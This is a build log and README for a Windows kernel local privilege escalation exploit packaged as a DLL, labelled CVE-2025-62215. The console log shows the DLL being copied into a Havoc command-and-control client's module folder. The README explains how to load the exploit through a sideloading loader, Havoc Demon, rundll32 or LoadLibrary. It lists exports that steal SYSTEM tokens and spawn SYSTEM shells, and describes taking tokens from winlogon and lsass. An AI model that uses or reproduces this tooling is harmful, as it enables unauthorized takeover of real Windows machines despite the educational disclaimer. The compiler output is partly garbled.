C:\Users\Admin\Desktop\Projects\LPE\CVE-2025-62215>cd C:\Users\Admin\Desktop\Projects\LPE\CVE-2025-62215 && cl.exe /O2 /LD exploit_dll.cpp /Fe:cve_2025_62215.dll && copy /Y cve_2025_62215.dll C:\Users\Admin\Desktop\Projects\HavocClient\commander\modules\lpe\bin\ && del exploit_dll.obj exploit_dll.exp exploit_dll.lib
ÐžÐ¿Ñ‚Ð¸Ð¼Ð¸Ð·Ð¸Ñ€ÑƒÑŽÑ‰Ð¸Ð¹ ÐºÐ¾Ð¼Ð¿Ð¸Ð»ÑÑ‚Ð¾Ñ€ Microsoft (R) C/C++ Ð²ÐµÑ€ÑÐ¸Ð¸ 19.44.35209 Ð´Ð»Ñ x64
(C) ÐšÐ¾Ñ€Ð¿Ð¾Ñ€Ð°Ñ†Ð¸Ñ ÐœÐ°Ð¹ÐºÑ€Ð¾ÑÐ¾Ñ„Ñ‚ (Microsoft Corporation).  Ð’ÑÐµ Ð¿Ñ€Ð°Ð²Ð° Ð·Ð°Ñ‰Ð¸Ñ‰ÐµÐ½Ñ‹.

exploit_dll.cpp
Microsoft (R) Incremental Linker Version 14.44.35209.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/dll
/implib:cve_2025_62215.lib
/out:cve_2025_62215.dll
exploit_dll.obj
   Ð¡Ð¾Ð·Ð´Ð°ÐµÑ‚ÑÑ Ð±Ð¸Ð±Ð»Ð¸Ð¾Ñ‚ÐµÐºÐ° cve_2025_62215.lib Ð¸ Ð¾Ð±ÑŠÐµÐºÑ‚ cve_2025_62215.exp
Ð¡ÐºÐ¾Ð¿Ð¸Ñ€Ð¾Ð²Ð°Ð½Ð¾ Ñ„Ð°Ð¹Ð»Ð¾Ð²:         1.



# CVE-2025-62215 Exploit PoC

Original code credit: https://github.com/dexterm300

## ðŸ§¨ Description

This repository contains a proof-of-concept exploit for **CVE-2025-62215**, a **race condition** vulnerability in the Windows kernel that can be triggered via concurrent manipulation of kernel object handles. Under specific conditions, this results in a **double-free**, which can be exploited for **local privilege escalation** to **SYSTEM**.

The exploit works by:

- Creating multiple threads that rapidly open and close kernel object handles
- Exploiting a timing window to trigger double-free conditions
- Using heap spraying to manipulate memory layout
- Detecting elevated privileges using a monitor thread

---

## âš ï¸ Disclaimer

This code is provided **for educational and authorized security testing purposes only**. Running this on production systems or without explicit permission is **strictly prohibited**.

---

## ðŸ› ï¸ Features

- Multithreaded race condition trigger
- Heap spray for layout control
- Privilege check using access token elevation
- Test mode for safer execution
- Thread-safe logging and graceful shutdown
- Minimal dependencies; builds cleanly with `cl.exe` (MSVC)

---

## ðŸ§ª Requirements

- Windows 10/11 (x64)
- MSVC (`cl.exe`) compiler with Debug CRT (`/MDd`)
- Administrator rights for full privilege escalation
- `ntdll.dll` for direct syscall bindings

---

## ðŸ› ï¸ Build Instructions

### ðŸªŸ Visual Studio (Recommended)
1. Open in Visual Studio
2. Set configuration to `Debug x64`
3. Build and run with elevated privileges

### ðŸ”§ Command Line (PowerShell or Developer CMD)
May need to install C++ build tools: https://visualstudio.microsoft.com/visual-cpp-build-tools/
& "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat"



```bash
cl.exe poc.cpp /Od /ZI /RTC1 /MDd /link /OUT:unicorn.exe
```

---

## DLL Version (exploit_dll.cpp)

DLL variant designed for integration with Phantom53 loader (GUP.exe sideloading) and Havoc Demon.

### Build DLL

```bash
# Release (no logs, small binary)
build_dll.bat release

# Debug (OutputDebugString logging, use DebugView to see [LPE] messages)
build_dll.bat debug

# Or manually:
cl.exe /O2 /MD /LD /GS- exploit_dll.cpp /link /OUT:cve_2025_62215.dll kernel32.lib advapi32.lib user32.lib
```

### DLL Exports

| Export | Description |
|--------|-------------|
| `DllMain` | Auto-runs exploit on DLL_PROCESS_ATTACH (background thread) |
| `StartW` / `Start` | Phantom53 loader & rundll32 compatible entry |
| `RunExploit` | Blocking call, returns TRUE if elevated to SYSTEM |
| `IsExploitDone` | Non-blocking status check |
| `GetSystemToken` | Returns stolen SYSTEM impersonation token handle |
| `SpawnSystemProcess` | Spawns new process as SYSTEM (pass cmdline or NULL for cmd.exe) |

### Usage

**1. Via Phantom53 loader (in GUP.exe)**
The loader finds `StartW` export, calls it. Exploit runs in background thread. Demon continues as SYSTEM.

**2. Via Havoc Demon (reflective loading / exec_shellcode)**
DLL is reflectively loaded, DllMain auto-triggers exploit. After success, Demon thread is SYSTEM.

**3. Via rundll32**
```bash
rundll32.exe cve_2025_62215.dll,StartW
```

**4. Direct LoadLibrary**
```c
HMODULE h = LoadLibraryA("cve_2025_62215.dll");
// DllMain already started the exploit in background

// Option A: blocking call
typedef BOOL (WINAPI *pfn)();
pfn RunExploit = (pfn)GetProcAddress(h, "RunExploit");
if (RunExploit()) {
    // current thread is now SYSTEM
}

// Option B: non-blocking poll
pfn IsExploitDone = (pfn)GetProcAddress(h, "IsExploitDone");
while (!IsExploitDone()) Sleep(100);

// Option C: spawn elevated process
typedef BOOL (WINAPI *pfnSpawn)(LPCWSTR);
pfnSpawn Spawn = (pfnSpawn)GetProcAddress(h, "SpawnSystemProcess");
Spawn(L"cmd.exe");
```

### Post-exploitation flow

```
DLL loaded (DllMain / StartW / RunExploit)
  |
  v
Kernel exploit: race condition threads (8x)
  |   heap spray -> double-free trigger
  |   monitor thread checks TokenElevation
  |
  +--[SUCCESS]--> Process token elevated at kernel level
  |                  |
  |                  v
  |               Steal SYSTEM token from winlogon.exe
  |                  |
  |                  v
  |               SetThreadToken -> calling thread is SYSTEM
  |               Demon operates as NT AUTHORITY\SYSTEM
  |
  +--[FALLBACK]--> Direct token theft (requires SeDebugPrivilege)
                     Tries: winlogon.exe -> lsass.exe -> services.exe -> csrss.exe
```

